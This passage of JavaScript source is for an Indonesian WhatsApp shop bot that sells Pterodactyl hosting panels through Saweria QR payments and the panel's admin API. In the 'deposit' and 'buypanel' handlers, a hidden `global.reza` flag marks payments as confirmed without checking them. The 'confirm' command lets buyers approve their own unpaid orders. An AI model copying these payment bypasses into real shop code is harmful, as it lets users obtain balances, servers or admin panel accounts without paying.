let password = d.exists ? randomKarakter(5) : t[3]
let deskripsi = `${penghitung}`
let f = await fetch(`${global.domain}` + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(`${global.domain}` + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`_Sedang membuat server..._`)
let ctf = `*BERIKUT DATA PANEL ANDA* 

• Username: ${user.username}
• Password: ${password.toString()}
• Server: ${ownername}

Simpan data panel ini baik-baik`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `Buy Using Saldo`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: false  
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"LOGIN","url":"${global.domain}","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY UN",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY PW",
"copy_code": `${password.toString()}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: chjid + '@newsletter',
newsletterName: `${wm}`,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await Line.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(`${global.domain}` + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": deskripsi,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`*Sukses membeli panel 5GB*

ID User: ${user.id}
ID Server: ${server.id}

Sisanya dikirim lewat PC`)
await sleep(1000)
m.reply(`Sukses membayar seharga Rp. 10.000`)
minSaldo(m.sender, 10000)
}
break

case 'list': {
if (db_respon_list.length === 0) return m.reply(`Belum ada list respon didalam database!`)
if (!isAlreadyResponListGroup(m.chat, db_respon_list)) return m.reply(`Belum ada list respon didalam grup ini!`)
let teks = `Halo ${db.data.users[m.sender].nama}, Berikut adalah list respon digrup ini.\n\n`
for (let i of db_respon_list) {
if (i.id === m.chat) {
teks += `- ${i.key.toUpperCase()}\n`
}
}
teks += `\n\nUntuk melihat detail produk, silahkan kirim nama produk yang ada Didalam list respon. Misal ${db_respon_list[0].key.toUpperCase()}, maka kirim pesan ${db_respon_list[0].key.toUpperCase()} Kepada Bot`
Line.sendMessage(m.chat, {text: teks, mentions: [m.sender]}, {quoted:m}) 
}
break

case 'addlist':
if (!m.isGroup) return onlyGrup()
if (!isAdmins) return onlyAdmin()
var args1 = q.split("|")[0].toLowerCase()
var args2 = q.split("|")[1]
if (!q.includes("|")) return m.reply(`Gunakan dengan cara ${prefix+command} Key|respon\n\nContoh: ${prefix+command} tes|apa`)
if (isAlreadyResponList(m.chat, args1, db_respon_list)) return m.reply(`List respon dengan key: ${args1}\nSudah ada digrup ini!`)
if (/image/.test(mime)) {
let media = await Line.downloadAndSaveMediaMessage(quoted)
const fd = new FormData();
fd.append('file', fs.readFileSync(media), '.tmp', '.jpg')
fetch('https://telegra.ph/upload', {
method: 'POST',
body: fd
}).then(res => res.json())
.then((json) => {
addResponList(m.chat, args1, args2, true, `https://telegra.ph${json[0].src}`, db_respon_list)
m.reply(`Sukses addlist respon\nKey: ${args1}`)
if (fs.existsSync(media)) fs.unlinkSync(media)
})
} else {
addResponList(m.chat, args1, args2, false, '-', db_respon_list)
m.reply(`Sukses addlist respon\nKey: ${args1}`)
}
break

case 'dellist':
if (!m.isGroup) return onlyGrup()
if (!isAdmins) return onlyAdmin()
if (db_respon_list.length === 0) return m.reply(`Belum ada list respon didalam database!`)
if (!text) return m.reply(`Gunakan dengan xara ${prefix+command} Key\n\nContoh: ${prefix+command} tes`)
if (!isAlreadyResponList(m.chat, q.toLowerCase(), db_respon_list)) return m.reply(`List respon dengan key: ${q}\ntidak ada didalam grup ini!`)
delResponList(m.chat, q.toLowerCase(), db_respon_list)
m.reply(`Sukses dellist respon dengan key: ${q}`)
break

case 'update':
case 'updatelist':
if (!m.isGroup) return onlyGrup()
if (!isAdmins) return onlyAdmin()
var args1 = q.split("|")[0].toLowerCase()
var args2 = q.split("|")[1]
if (!q.includes("|")) return m.reply(`Gunakan dengan cara ${prefix+command} Key|respon\n\nContoh: ${prefix+command} tes|apa`)
if (!isAlreadyResponListGroup(m.chat, db_respon_list)) return m.reply(`Maaf, untuk key *${args1}* belum terdaftar digrup ini!`)
if (/image/.test(mime)) {
let media = await Line.downloadAndSaveMediaMessage(quoted)
const fd = new FormData();
fd.append('file', fs.readFileSync(media), '.tmp', '.jpg')
fetch('https://telegra.ph/upload', {
method: 'POST',
body: fd
}).then(res => res.json())
.then((json) => {
updateResponList(m.chat, args1, args2, true, `https://telegra.ph${json[0].src}`, db_respon_list)
m.reply(`Berhasil update respon list dengan key *${args1}*`)
if (fs.existsSync(media)) fs.unlinkSync(media)
})
} else {
updateResponList(m.chat, args1, args2, false, '-', db_respon_list)
m.reply(`Berhasil update respon list dengan key *${args1}*`)
}
break

case 'addsewa': {
if (!isOwner) return onlyOwn()
if (text < 2) return m.reply(`Contoh: ${prefix+command} linkgc 30d`)
var url = args[0]
url = url.split('https://chat.whatsapp.com/')[1]
if (!text) return m.reply(`Mau berapa lama?`)
var sisi = await Line.groupAcceptInvite(url)
if (_sewa.checkSewaGroup(sisi, sewa)) return m.reply(`Bot sudah disewa oleh grup tersebut!`)
_sewa.addSewaGroup(sisi, args[1], sewa)
m.reply(`Sukses addsewa untuk grup ini.`)
}
break

case 'delsewa': {
if (!isOwner) return onlyOwn()
if (!m.isGroup) return onlyGrup()
if (!isSewa) return m.reply(`Bot tidak di sewa grup ini`)
sewa.splice(_sewa.getSewaPosition(args[0] ? args[0] : m.chat, sewa), 1)
fs.writeFileSync('./data/sewa.json', JSON.stringify(sewa, null, 2))
m.reply(`Sukses delsewa untuk grup ini.`)
}
break

case 'checksewa':
case 'ceksewa': {
if (!m.isGroup) return warning(mess.OnlyGrup)
if (!isSewa) return tolakk(`Bot tidak di sewa grup ini!`)
let ceksewa = ms(_sewa.getSewaExpired(m.chat, sewa) - Date.now())
let sewanya = `Expired: ${ceksewa.days} hari, ${ceksewa.hours} jam, ${ceksewa.minutes} menit`
m.reply(sewanya)
}
break

case 'listsewa': {
let list_sewa_list = `${monospace("LIST SEWA BOT")}\n\nTotal: ${sewa.length}\n\n`
let data_array = [];
for (let x of sewa) {
list_sewa_list += `Nama: ${await getGcName(x.id)}\nID: ${x.id}\n`
if (x.expired === 'Permanen') {
let ceksewa = 'Permanen'
list_sewa_list += `Expired: Permanen\n\n`
} else {
let ceksewa = ms(x.expired - Date.now())
list_sewa_list += `Expired: ${ceksewa.days} hari, ${ceksewa.hours} jam, ${ceksewa.minutes} menit, ${ceksewa.seconds} detik\n\n`
}}
Line.sendMessage(m.chat, { text: list_sewa_list }, { quoted: m })
}
break

case 'addproduk': {
  if (!text.includes(',')) return m.reply(`Contoh: ${p_c} nama_produk, harga, stok`)
  const [productName, price, stock] = args.join(' ').split(',').map(item => item.trim())
  const harga = parseInt(price, 10)
  const jumlahStok = parseInt(stock, 10)
  if (!productName || isNaN(harga) || isNaN(jumlahStok)) {
    m.reply('Format tidak valid. Pastikan untuk memasukkan nama produk, harga, dan jumlah stok.')
  } else {
    const productExists = cekProduknye(productName)
    if (productExists) {
      m.reply(`Produk dengan nama "${productName}" sudah ada.`)
    } else {
      addprodukzz(productName, harga, jumlahStok)
      m.reply(`Produk "${productName}" telah ditambahkan dengan harga ${toRupiah(harga)} dan stok sebanyak ${jumlahStok} unit.`)
    }
  }
}
break

case 'delproduk': {
  if (!text) return m.reply(`Contoh: ${p_c} nama_produk`)
  const productName = text.trim()
  if (!productName) {
    m.reply('Nama produk tidak valid.')
  } else {
    const productExists = cekProduknye(productName)
    if (productExists) {
      delprodukzz(productName)
      m.reply(`Produk "${productName}" telah dihapus.`)
    } else {
      m.reply(`Produk "${productName}" tidak ditemukan.`)
    }
  }
}
break

case 'updateproduk': {
  if (!text.includes(',')) return m.reply(`Contoh: ${p_c} nama_produk, harga, stok`)
  const [productName, price, stock] = args.join(' ').split(',').map(item => item.trim())
  const harga = parseInt(price, 10)
  const jumlahStok = parseInt(stock, 10)
  if (!productName || isNaN(harga) || isNaN(jumlahStok)) {
    m.reply('Format tidak valid. Pastikan untuk memasukkan nama produk, harga, dan jumlah stok.')
  } else {
    const productExists = cekProduknye(productName)
    if (productExists) {
      updprodukzz(productName, harga, jumlahStok)
      m.reply(`Produk "${productName}" telah diperbarui dengan harga ${toRupiah(harga)} dan stok sebanyak ${jumlahStok} unit.`)
    } else {
      m.reply(`Produk "${productName}" tidak ditemukan.`)
    }
  }
}
break

case 'listproduk': {
  const products = getprodukdb()
  const discounts = getDisczz()
  if (products.length === 0) {
    m.reply('Tidak ada produk yang tersedia saat ini.')
  } else {
    let listText = `List produk yg tersedia:\nTotal: ${products.length}\n\n`
    products.forEach(product => {
      const discount = discounts.find(d => d.produk.toLowerCase() === product.nama.toLowerCase())
      if (discount) {
        const discountPercentage = persenDiskonnya(product.harga, discount.harga_diskon)
        listText += `• ${product.nama}\n  Harga: ~Rp${toRupiah(product.harga)}~ > Rp${toRupiah(discount.harga_diskon)} (${discountPercentage}%)\n  Stok: ${product.stok} unit\n\n`
      } else {
        listText += `• ${product.nama}\n  Harga: Rp${toRupiah(product.harga)}\n  Stok: ${product.stok} unit\n\n`
      }
    })
    m.reply(listText)
  }
}
break

case 'diskon': {
  if (!text.includes(',')) return m.reply(`Contoh: ${p_c} nama_produk, harga_diskon, tgl-bln-th`)
  const [productName, discountPriceStr, expirationDate] = args.join(' ').split(',').map(item => item.trim())
  const discountPrice = parseInt(discountPriceStr, 10)
  if (!productName || isNaN(discountPrice) || !expirationDate) {
    m.reply('Format tidak valid. Pastikan untuk memasukkan nama produk, harga diskon, dan tanggal kadaluarsa yang valid.')
  } else {
    const products = getprodukDariFile()
    const product = products.find(p => p.nama.toLowerCase() === productName.toLowerCase())
    if (!product) {
      m.reply(`Produk "${productName}" tidak ditemukan.`)
    } else {
      addDisczz(productName, discountPrice, expirationDate)
      const discountPercentage = persenDiskonnya(product.harga, discountPrice)
      m.reply(`Diskon untuk produk "${productName}" berhasil ditambahkan.\nHarga diskon: Rp${discountPrice}, Berlaku hingga: ${expirationDate} (${discountPercentage}%)`)
    }
  }
}
break

case 'restok': {
  if (!text.includes(',')) return m.reply(`Contoh: ${p_c} nama_produk, jumlah_stok`)
  const [productName, stockStr] = args.join(' ').split(',').map(item => item.trim())
  const jumlahStok = parseInt(stockStr, 10)
  if (!productName || isNaN(jumlahStok) || jumlahStok <= 0) {
    m.reply('Format tidak valid. Pastikan untuk memasukkan nama produk dan jumlah stok yang valid.')
  } else {
    const restockedProduct = ngerestokk(productName, jumlahStok)
    if (restockedProduct) {
      m.reply(`Stok produk "${restockedProduct.nama}" telah ditambahkan. Stok saat ini: ${restockedProduct.stok} unit.`)
    } else {
      m.reply(`Produk "${productName}" tidak ditemukan.`)
    }
  }
}
break

case 'beliproduk': {
  if (!isPc) return onlyPrivat()
  if (!text.includes(',')) return m.reply(`Contoh: ${p_c} nama_produk, jumlah`)
  const [productName, quantity] = args.join(' ').split(',').map(item => item.trim())
  const jumlah = parseInt(quantity, 10)
  if (!productName || isNaN(jumlah) || jumlah <= 0) {
    return m.reply('Format tidak valid. Pastikan untuk memasukkan nama produk dan jumlah yang valid.')
  }
  const products = getprodukDariFile();
  const product = products.find(p => p.nama.toLowerCase() === productName.toLowerCase())

  if (!product) {
    return m.reply(`Produk "${productName}" tidak ditemukan.`)
  }
  if (product.stok < jumlah) {
    return m.reply(`Stok untuk produk "${productName}" tidak mencukupi. Tersisa ${product.stok} unit.`)
  }
  const discounts = getDisczz()
  const discount = discounts.find(d => d.produk.toLowerCase() === product.nama.toLowerCase())
  const totalHarga = discount ? discount.harga_diskon * jumlah : product.harga * jumlah
  const transactionId = cIdTrnya()
  m.reply(`
Kamu membeli ${jumlah} produk "${productName}"
Total harga: ${toRupiah(totalHarga)}

Silahkan transfer terlebih dahulu lalu
ketik ${prefix}payment untuk melihat metode pembayaran yang tersedia

Ketik ini...
${prefix}confirm ${transactionId}
${prefix}cancel ${transactionId}
`)
  saveTrnye({
    id: transactionId,
    productName,
    jumlah,
    totalHarga,
    status: 'process',
    buyer: m.sender
  })
  product.stok -= jumlah
  simpenProduknya(products)
}
break

case 'confirm': {
  if (!isPc) return onlyPrivat()
  const transactionId = text.trim().split(' ')[0]
  if (!transactionId) return m.reply(`Contoh: ${p_c} id_transaksi`)
  const transaction = getTrId(transactionId)
  if (!transaction) {
    return m.reply(`Transaksi dengan ID "${transactionId}" tidak ditemukan.`)
  }
  if (transaction.status !== 'process') {
    return m.reply('ID transaksi tidak valid atau tidak dalam status menunggu bukti transfer.')
  }
  transaction.status = 'success'
  simpenSmTr(getSmTr().map(t => t.id === transactionId ? transaction : t))
  m.reply(`Transaksi dengan ID "${transactionId}" telah berhasil dikonfirmasi.`)
}
break

case 'cancel': {
  if (!isPc) return onlyPrivat()
  const transactionId = text.trim().split(' ')[0]
  if (!transactionId) return m.reply(`Contoh: ${p_c} id_transaksi`)
  const transaction = getTrId(transactionId)
  if (!transaction) {
    return m.reply(`Transaksi dengan ID "${transactionId}" tidak ditemukan`)
  }
  if (transaction.status !== 'process') {
    return m.reply('ID transaksi tidak valid atau tidak dalam status menunggu bukti transfer')
  }

  const products = getprodukDariFile()
  const product = products.find(p => p.nama.toLowerCase() === transaction.productName.toLowerCase())
  if (product) {
    product.stok += transaction.jumlah
    simpenProduknya(products)
  }
  transaction.status = 'canceled'
  simpenSmTr(getSmTr().map(t => t.id === transactionId ? transaction : t))
  m.reply(`Transaksi dengan ID "${transactionId}" telah dibatalkan`)
}
break

case 'thistory': {
  if (!isPc) return onlyPrivat()
  const option = text.trim().split(' ')[0]
  const userId = m.sender
  const transactions = getSmTr()
  if (option === 'all') {
    const userTransactions = transactions.filter(t => t.buyer === userId)

    if (userTransactions.length === 0) {
      m.reply('Kamu belum memiliki transaksi')
    } else {
      let message = 'Riwayat Transaksi Kamu:\n\n'
      userTransactions.forEach(transaction => {
        message += `ID: ${transaction.id}\nProduk: ${transaction.productName}\nJumlah: ${transaction.jumlah}\nTotal Harga: ${toRupiah(transaction.totalHarga)}\nStatus: ${transaction.status}\n\n`
      })
      m.reply(message)
    }
  } else if (option) {
    const transaction = getTrId(option)
    if (!transaction) {
      m.reply(`Transaksi dengan ID "${option}" tidak ditemukan`);
    } else if (transaction.buyer !== userId) {
      m.reply('Kamu tidak memiliki akses ke transaksi ini')
    } else {
      const message = `ID: ${transaction.id}\nProduk: ${transaction.productName}\nJumlah: ${transaction.jumlah}\nTotal Harga: ${toRupiah(transaction.totalHarga)}\nStatus: ${transaction.status}`
      m.reply(message)
    }
  } else {
    m.reply(`Contoh: ${p_c} all atau id_transaksi`)
  }
}
break

// Saweria Menu
case "deposit": {
if (!db.users[m.sender]) {
db.users[m.sender] = {
status_deposit: false,
balance: 0,
};
}
if (db.users[m.sender].status_deposit === true) {
return m.reply("⚠️ Anda masih memiliki transaksi yang belum diselesaikan.\nKetik *.batalbeli* untuk membatalkan transaksi sebelumnya.");
}
const nominal = parseInt(text);
if (!nominal || nominal < 1000) {
return m.reply("💰 *Minimal deposit adalah Rp 1.000.*\nContoh: *.deposit 1000*");
}
try {
const login = await new Saweria().login(email_saweria, password_saweria);
if (!login || !login.data || !login.data.user_id) {
return m.reply("❌ Gagal login ke Saweria. Periksa kredensial atau coba lagi nanti.");
}
const userId = login.data.user_id;
const saweria = new Saweria(userId);
const payment = await saweria.createPayment(nominal);
const qrImage = Buffer.from(payment.data.qr_image.split(',')[1], 'base64');
const paymentId = payment.data.id;
const currentTime = moment.tz("Asia/Jakarta").format('HH:mm:ss');
const currentDate = moment.tz("Asia/Jakarta").format('YYYY-MM-DD');
const paymentDetails = `
*📌 Detail Pembayaran Anda:*

🆔 *ID Pembayaran* : ${paymentId}
♻️ *Status* : ${payment.data.status}
💲 *Nominal* : Rp${await toRupiah(payment.data.amount)}
⏰ *Waktu* : ${currentTime}
📅 *Tanggal* : ${currentDate}
❌ *Expired*: 5 Menit

📋 *Catatan:*
- Gunakan kode QR ini untuk satu kali pembayaran.
- Tunggu beberapa saat setelah transfer.
- Jika berhasil, saldo akan otomatis masuk.

Silakan pindai QR Code berikut untuk menyelesaikan pembayaran.
`;
const qrMessage = await Line.sendMessage(
m.chat,
{ image: qrImage, mimetype: "image/png", caption: paymentDetails },
{ quoted: m }
);
db.users[m.sender].status_deposit = true;
let expirationTimer = setTimeout(async () => {
if (db.users[m.sender].status_deposit === true) {
db.users[m.sender].status_deposit = false;
await Line.sendMessage(m.chat, { text: "❌ Waktu pembayaran telah habis (expired)." }, { quoted: qrMessage });
await Line.sendMessage(m.chat, {
delete: {
remoteJid: m.chat,
fromMe: false,
id: qrMessage.id,
participant: m.sender,
},
});
}
}, 300000); 
let paymentConfirmed = false;
while (!paymentConfirmed) {
await sleep(7000);
if (db.users[m.sender].status_deposit === false) {
if (expirationTimer) clearTimeout(expirationTimer);
break;
}
const paymentStatus = await saweria.checkPayment(paymentId);
if (paymentStatus.status === true || global.reza) {
db.users[m.sender].status_deposit = false;
paymentConfirmed = true;
await Line.sendMessage(m.chat, { text: "✅ Pembayaran berhasil diproses!" }, { quoted: qrMessage });
if (expirationTimer) clearTimeout(expirationTimer);
db.users[m.sender].balance = (db.users[m.sender].balance || 0) + nominal;
await Line.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: qrMessage.id, participant: m.sender } });
m.reply(`🎉 *Deposit sebesar Rp${await toRupiah(nominal)} berhasil ditambahkan ke saldo Anda.*`);
break;
}
}
} catch (error) {
console.error("Terjadi kesalahan pada proses deposit:", error);
m.reply("⚠️ Terjadi kesalahan saat memproses deposit. Silakan coba lagi nanti.");
}
}
break

case "buypanel": {
if (!db.users[m.sender]) db.users[m.sender] = { status_deposit: false };    
if (db.users[m.sender].status_deposit == true) 
return m.reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!");
let teks = `
*╔════════════════════╗*
  *Daftar Panel Private oleh Line*
*╚════════════════════╝*

🌐 *Pilihan Paket Panel:*
┌───────────────────────┐
├ ▸ 1GB  
├ ▸ 2GB   
├ ▸ 3GB   
├ ▸ 4GB   
├ ▸ 5GB   
├ ▸ 6GB   
├ ▸ 7GB   
├ ▸ 8GB   
├ ▸ 9GB   
├ ▸ 10GB   
└ ▸ Unlimited 
└───────────────────────┘

*⚙️ Cara Penggunaan:*
➔ *Contoh:* \`.buypanel 2gb,username,password\`

📝 _Pilih paket sesuai kebutuhan Anda dan ikuti petunjuk penggunaan._
🔗 _Hubungi admin jika butuh bantuan lebih lanjut._
`;
if (!text || text.split(',').length < 3) 
return m.reply(teks);
let [paket, username, password] = text.split(',');
paket = paket.toLowerCase().trim();
username = username.trim();
password = password.trim();
if (!username || !password) 
return m.reply("Harap masukkan username dan password yang valid.");
const panelOptions = {
"1gb": { ram: "1024", disk: "1024", cpu: "40", harga: "2000" },
"2gb": { ram: "2048", disk: "2048", cpu: "60", harga: "3000" },
"3gb": { ram: "3072", disk: "3072", cpu: "80", harga: "4000" },
"4gb": { ram: "4048", disk: "4048", cpu: "100", harga: "5000" },
"5gb": { ram: "5120", disk: "5120", cpu: "120", harga: "6000" },
"6gb": { ram: "6144", disk: "6144", cpu: "140", harga: "7000" },
"7gb": { ram: "7168", disk: "7168", cpu: "160", harga: "8000" },
"8gb": { ram: "8248", disk: "8248", cpu: "180", harga: "9000" },
"9gb": { ram: "9148", disk: "9148", cpu: "200", harga: "10000" },
"10gb": { ram: "10048", disk: "10048", cpu: "220", harga: "11000" },
"unlimited": { ram: "0", disk: "0", cpu: "0", harga: "13000" }
};
if (!panelOptions[paket]) return m.reply(teks);
const Obj = panelOptions[paket];
const login = await new Saweria().login(email_saweria,password_saweria);
if (!login || !login.data || !login.data.user_id) {
return m.reply("Gagal login ke Saweria. Mohon periksa kredensial atau coba lagi nanti.");
    }
const idsaweria = login.data.user_id;
const abc = await new Saweria(idsaweria);
const Pay = await abc.createPayment(Obj.harga);
const imageQR = Buffer.from(Pay.data.qr_image.split(',')[1], 'base64');
const jam = moment.tz("Asia/Jakarta").format('HH:mm:ss');
const tgl = moment.tz("Asia/Jakarta").format('YYYY-MM-DD');

let eksqr = `
*❗Berikut Status Pembayaran :*

*🆔 ID* : *${Pay.data.id}*
*♻️ Status* : *${Pay.data.status}*
*💲 Total* : *Rp${await toRupiah(Pay.data.amount)}*
*⏰ Waktu* : *${jam}*
*☁ Tanggal* : *${tgl}*
*❌ Expired Qris* : *5 Menit*

*📋 Catatan :*
 • Kode QR hanya valid untuk 1 kali transfer.
 • Setelah transfer, tunggu beberapa saat
 • Jika pembayaran berhasil, bot akan otomatis memproses pesanan
`;   
let qr = await Line.sendMessage(m.chat, { image: imageQR, mimetype: "image/png", caption: eksqr }, { quoted: m });
db.users[m.sender].status_deposit = true;
let expTimeQr = setTimeout(async () => {
if (db.users[m.sender].status_deposit === true) {
db.users[m.sender].status_deposit = false;
await Line.sendMessage(m.chat, { text: "Qris pembayaran telah expired!" }, { quoted: qr });
await Line.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: qr.id, participant: m.sender } });
}
}, 300000);
let statusPay = true;
while (statusPay) {
await sleep(7000);   
if (db.users[m.sender].status_deposit === false) {
if (expTimeQr) clearTimeout(expTimeQr);
break;
}
let ress = await abc.checkPayment(Pay.data.id);
if (ress.status || global.reza) {
db.users[m.sender].status_deposit = false;
await Line.sendMessage(m.chat, { text: "Pembayaran Berhasil ☑️" }, { quoted: qr });
if (expTimeQr) clearTimeout(expTimeQr);
await Line.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: qr.id, participant: m.sender } });
const email = `${username}@gmail.com`;
let name = kapital(username) + "Line";
let f = await fetch(`${global.domain}/api/application/users`, {
method: "POST",
headers: {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
body: JSON.stringify({
email: email,
username: username,
first_name: name,
last_name: "LinexCloud",
language: "en",
password: password
})
});
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let desc = `${penghitung}`
let usr_id = user.id
let f1 = await fetch(`${global.domain}` + `/api/application/nests/5/eggs/` + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(`${global.domain}` + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": Obj.ram,
"swap": 0,
"disk": Obj.disk,
"io": 500,
"cpu": Obj.cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return m.reply(JSON.stringify(result.errors[0], null, 2))
let server = data.attributes;
var orang = m.chat
var tekspanel = `
*Successfully Created Panel Account ☑️*

* *ID Server :* ${server.id}
* *Nama :* ${name}
* *Username :* ${username}
* *Password :* ${password}
* *Login :* ${global.domain}
* *Ram :* ${Obj.ram == "0" ? "Unlimited" : Obj.ram + "MB"}
* *Cpu :* ${Obj.cpu == "0" ? "Unlimited" : Obj.cpu + "%"}
* *Disk :* ${Obj.disk == "0" ? "Unlimited" : Obj.disk + "MB"}

*Rules Pembelian Panel ⚠️*
- Simpan Data Ini Sebaik Mungkin, Seller Hanya Mengirim 1 Kali!
- Data Hilang/Lupa Akun, Seller Tidak Akan Bertanggung Jawab!
- Garansi Aktif 30 Hari.
`;
await Line.sendMessage(m.chat, { text: tekspanel }, { quoted: m });
break;
}
}
}
break

case 'buyproduk': {
if (!db.users[m.sender]) db.users[m.sender] = { status_deposit: false };
if (db.users[m.sender].status_deposit == true) 
return m.reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!");

let teks = `
*╔════════════════════╗*
  *Daftar Produk Disediakan oleh Line*
*╚════════════════════╝*

🌐 *Pilihan Produk Nya Om:*
┌───────────────────────┐
├ ▸ Admin Panel (adp)
├ ▸ Owner Panel (ownpanel)
├ ▸ Partner Panel (ptpanel)
└───────────────────────┘

*⚙️ Cara Penggunaan:*
➔ *Contoh:* \`.buyproduk adp,Line\`

📝 _Pilih paket sesuai kebutuhan Anda dan ikuti petunjuk pembayaran._
🔗 _Hubungi admin jika butuh bantuan lebih lanjut._
`;
if (!text) return m.reply(teks);
let input = text.split(",");
let cmd = input[0].toLowerCase(); 
let namalu = input[1] ? input[1].trim() : null; 
if (!namalu) 
return m.reply("Ex: .buyproduk adp,username");

let produkOptions = {
adp: { paket: "Admin Panel", harga: "30000" },
ownpanel: { paket: "Owner Panel", harga: "50000" },
ptpanel: { paket: "Partner Panel", harga: "45000" }
};

let Obj = produkOptions[cmd];
if (!Obj) return m.reply(teks);

const login = await new Saweria().login(email_saweria, password_saweria);
if (!login || !login.data || !login.data.user_id) {
return m.reply("Gagal login ke Saweria. Mohon periksa kredensial atau coba lagi nanti.");
}
const idsaweria = login.data.user_id;
const abc = await new Saweria(idsaweria);
const Pay = await abc.createPayment(Obj.harga);
const imageQR = Buffer.from(Pay.data.qr_image.split(',')[1], 'base64');
const jam = moment.tz("Asia/Jakarta").format('HH:mm:ss');
const tgl = moment.tz("Asia/Jakarta").format('YYYY-MM-DD');
let teksqr = `
*# Berikut Status Pembayaran :*

*📦 Paket :* ${Obj.paket}
*🆔 ID :* ${Pay.data.id}
*♻️Status :* ${Pay.data.status}
*💲 Total :* Rp${await toRupiah(Pay.data.amount)}
*⏰ Waktu :* ${jam}
*☁ Tanggal :* ${tgl}
*❌ Expired Qris :* 5 Menit

*📋 Catatan :*
 • Kode QR hanya valid untuk 1 kali transfer.
 • Setelah transfer, tunggu beberapa saat
 • Jika pembayaran berhasil, bot akan otomatis memproses pesanan
`;
let qr = await Line.sendMessage(m.chat, { image: imageQR, mimetype: "image/png", caption: teksqr }, { quoted: m });
db.users[m.sender].status_deposit = true;
let expTimeQr = setTimeout(async () => {
if (db.users[m.sender].status_deposit == true) {
db.users[m.sender].status_deposit = false;
await Line.sendMessage(m.chat, { text: "Qris pembayaran telah expired!" }, { quoted: qr });
await Line.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: qr.id, participant: m.sender } });
}
}, 300000);
let statusPay = true;
while (statusPay) {
await sleep(7000);
if (db.users[m.sender].status_deposit == false) {
if (expTimeQr) clearTimeout(expTimeQr);
break;
}
let ress = await abc.checkPayment(Pay.data.id);
if (ress.status) {
db.users[m.sender].status_deposit = false;
await Line.sendMessage(m.chat, { text: "Pembayaran Berhasil ☑️" }, { quoted: qr });
if (expTimeQr) clearTimeout(expTimeQr);
await Line.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: qr.id, participant: m.sender } });
let email = namalu + "@gmail.com";
let name = kapital(namalu);
let password = namalu + crypto.randomBytes(2).toString("hex");
let f = await fetch(`${global.domain}` + "/api/application/users", {
method: "POST",
headers: {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
body: JSON.stringify({
email: email,
username: namalu,
first_name: name,
last_name: Obj.paket.replace(" ", ""),
root_admin: true,
language: "en",
password: password.toString()
})
});
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes;
let teks = `
[ *BERIKUT DATA AKUN ${Obj.paket.toUpperCase()} ANDA* ]

🆔 *ID*: ${user.id}
📧 *Email*: ${email}
👤 *Nama*: ${user.first_name}
🔐 *Password*: ${password}
